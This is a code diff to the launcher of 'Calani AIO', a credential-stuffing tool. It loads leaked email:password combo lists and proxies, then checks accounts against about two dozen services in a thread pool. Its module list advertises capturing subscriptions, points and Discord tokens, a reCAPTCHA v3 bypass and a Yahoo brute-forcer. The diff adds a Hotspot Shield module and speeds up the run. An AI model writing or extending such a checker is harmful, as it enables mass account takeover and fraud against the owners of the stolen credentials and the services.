@@ -1,65 +1,63 @@
-from modules.variables import Checker, discord
+from modules.variables import Checker, discord_name
 from modules.functions import *
 from time import sleep
 from multiprocessing.dummy import Pool
 from threading import Thread
 
-from modules.checkers import nordvpn
+from modules.checkers import nord_vpn
 from modules.checkers import bonk_io
 from modules.checkers import disney
 from modules.checkers import duolingo
 from modules.checkers import gfuel
 from modules.checkers import crunchyroll
-from modules.checkers import spotifyvm
 from modules.checkers import bww
 from modules.checkers import pornhub
 from modules.checkers import honeygain
-from modules.checkers import discordvm
-from modules.checkers import discord_solver
+from modules.checkers import discord
 from modules.checkers import steam
 from modules.checkers import windscribe
 from modules.checkers import instagram
 from modules.checkers import uplay
 from modules.checkers import paramount
 from modules.checkers import ipvanish
-from modules.checkers import tunnelbear
+from modules.checkers import tunnel_bear
 from modules.checkers import plextv
 from modules.checkers import origin
 from modules.checkers import yahoo
 from modules.checkers import dominos
 from modules.checkers import dickeys
+from modules.checkers import hotspot_shield
 
 modules_list = {
-    "disney+ [full capture | us proxies]":disney,
-    "plextv [subscription capture]":plextv,
-    "duolingo [full capture]":duolingo,
-    "gfuel [full capture]":gfuel,
-    "crunchyroll [subscription capture]":crunchyroll,
-    "spotify [valid mail]":spotifyvm,
     "bww [points capture | proxyless]":bww,
     "dominos [points capture | recaptcha v3 bypass]":dominos,
     "dickeys [points capture]":dickeys,
-    "pornhub [subscription capture]":pornhub,
     "honeygain [credits capture]":honeygain,
     'yahoo [brute]':yahoo,
-    "discord [token capture | solver]":discord_solver,
-    "discord [valid mail]":discordvm,
+    "discord [token capture | solver]":discord,
     "instagram [followers capture]":instagram,
+    "disney+ [full capture]":disney,
+    "duolingo [full capture]":duolingo,
+    "gfuel [full capture]":gfuel,
     "bonk.io [full capture]":bonk_io,
     "uplay [full capture]":uplay,
     "origin [full capture]":origin,
     "steam [full capture]":steam,
     "paramount [full capture]":paramount,
-    "nordvpn [subscription capture]":nordvpn,
+    "plextv [subscription capture]":plextv,
+    "crunchyroll [subscription capture]":crunchyroll,
+    "pornhub [subscription capture]":pornhub,
+    "nordvpn [subscription capture]":nord_vpn,
     "windscribe [subscription capture]":windscribe,
     "ipvanish [subscription capture]":ipvanish,
-    "tunnelbear [subscription capture]":tunnelbear,
+    "tunnelbear [subscription capture]":tunnel_bear,
+    "hotspot shield [subscription capture]":hotspot_shield,
 }
 
 def starter(modules_lst:list):
     """Starts checking accounts"""
     reset_stats()
-    set_title(f"Calani AIO | Getting Ready | {discord}")
+    set_title(f"Calani AIO | Getting Ready | {discord_name}")
     def initializeChecker(account:str):
         if ':' in account:
             email,password = account.split(":")
@@ -78,7 +76,6 @@ def starter(modules_lst:list):
     ascii()
     print("\n\n")
     print(f"    [{cyan}>{reset}] Pick Combo File")
-    sleep(1)
     file_path = get_file("Combo File",type="Combo File")
     if not file_path:
         print(f"    [{red}>{reset}] No File Detected")
@@ -98,12 +95,11 @@ def starter(modules_lst:list):
     print(f"    [{cyan}>{reset}] Imported {green}{len(before_accounts)}{reset} Accounts")
     if duplicates != 0:
         print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
-    sleep(1)
+    sleep(0.5)
 
     print("\n")
 
     print(f"    [{cyan}>{reset}] Pick Proxy File")
-    sleep(1)
     file_path = get_file("Proxy File File",type="Proxy File")
     if not file_path:
         print(f"    [{red}>{reset}] No File Detected")
@@ -122,7 +118,7 @@ def starter(modules_lst:list):
     print(f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies")
     if duplicates != 0:
         print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
-    sleep(1)
+    sleep(0.5)
 
     Checker.checking = True
     Checker.time = get_time()
@@ -141,8 +137,9 @@ def starter(modules_lst:list):
     mainpool.imap_unordered(func=initializeChecker,iterable=Checker.accounts)
     mainpool.close()
     mainpool.join()
-    sleep(5)
+    sleep(1)
     Checker.checking = False
     print("\n\n")
     print(f"    [{cyan}>{reset}] Finished Checking")
+    print(f"    [{cyan}>{reset}] Saved to Results/{Checker.time}")
     input(f"    [{cyan}>{reset}] Press Enter To Go Back")
